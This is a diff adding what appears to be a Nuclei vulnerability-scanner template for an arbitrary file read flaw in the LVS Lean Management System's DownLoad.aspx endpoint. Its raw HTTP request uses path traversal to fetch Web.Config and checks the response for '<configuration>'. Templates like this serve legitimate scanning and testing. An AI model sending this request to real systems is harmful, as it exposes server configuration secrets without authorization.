@@ -1,0 +1,31 @@
+id: Lean_Management_System_LVS_DownLoad_aspx_Fileread
+
+info:
+  name: Lean_Management_System_LVS_DownLoad_aspx_Fileread
+  author: HK
+  severity: high
+  description:   LVS精益管理系统/Business/DownLoad.aspx接口存在任意文件读取漏洞
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /Business/DownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - <configuration>
